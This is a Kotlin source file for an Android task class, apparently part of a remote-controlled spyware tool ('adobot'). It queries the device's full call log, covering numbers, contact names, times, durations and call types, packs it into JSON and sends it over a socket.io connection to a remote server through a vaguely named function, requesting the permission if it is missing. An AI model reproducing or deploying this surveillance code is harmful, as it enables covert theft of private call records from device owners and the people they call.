package me.adobot.tasks

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.support.v4.content.ContextCompat
import com.google.gson.Gson
import io.socket.client.Socket
import me.adobot.models.CallLog
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.ArrayList


class GetCallLogsTask(private val ctx: Context, private val arg1: Int=100, private val socket: Socket) : BaseTask(ctx) {

    private fun getCallLog():ArrayList<CallLog> {

        val strOrder = android.provider.CallLog.Calls.DATE + " DESC"
        val callUri = Uri.parse("content://call_log/calls")
        val cur = ctx.contentResolver.query(callUri, null, null, null, strOrder)

        val callLogList = ArrayList<CallLog>()

        while (cur.moveToNext()) {

            val number = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
            val name = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME))
            val millisDate = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DATE))
            val millisDuration = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.DURATION))
            val callType = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.TYPE))
            val isCallNew = cur.getString(cur.getColumnIndex(android.provider.CallLog.Calls.NEW))


            val formatter = SimpleDateFormat("dd-MMM-yyyy hh:mm aa", Locale.ENGLISH)
            val date = formatter.format(Date(millisDate.toLong()))

            val formatter2 = SimpleDateFormat("HH:mm:ss", Locale("en"))
            formatter2.timeZone = TimeZone.getTimeZone("UTC")
            val duration = formatter2.format(Date(millisDuration.toLong() * 1000))



            callLogList.add(CallLog(number, name
                    ?: "<unknown>", date, duration, callType, isCallNew
                    ?: "<unknown>"))
        }
        cur.close()
        return callLogList

    }

    private fun getJSON(list: ArrayList<CallLog>): String {
        return Gson().toJson(list)
    }

    private fun uploadCallLog(): String {
        return getJSON(getCallLog())
    }

    override fun run() {
        super.run()

        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED)
            /*socket.emit("callLogUpload", uploadCallLog(), Ack { args ->
                Log.d(tag, "Call Log Uploaded")
            })*/foo(uploadCallLog())
        else requestPermissions()
    }

    private fun foo(str:String){
        val data: HashMap<String, String> = HashMap()
        data.put("callLog", str)
        data.put("dataType", "callLog")

        socket.emit("usrData", JSONObject(data))
    }

}
